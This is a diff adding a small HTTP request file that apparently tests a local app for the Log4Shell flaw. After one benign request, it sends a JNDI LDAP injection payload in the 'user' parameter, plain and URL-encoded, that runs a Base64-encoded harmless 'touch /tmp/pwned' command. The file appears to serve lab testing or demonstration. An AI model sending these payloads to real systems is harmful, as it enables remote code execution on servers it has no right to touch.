@@ -1,0 +1,11 @@
+GET http://localhost:8080/?user=Thorsten
+
+###
+
+GET http://localhost:8080/?user=${jndi:ldap://localhost:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
+
+###
+
+GET http://localhost:8080/?user=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A1389%2FBasic%2FCommand%2FBase64%2FdG91Y2ggL3RtcC9wd25lZAo%3D%7D
+
+###
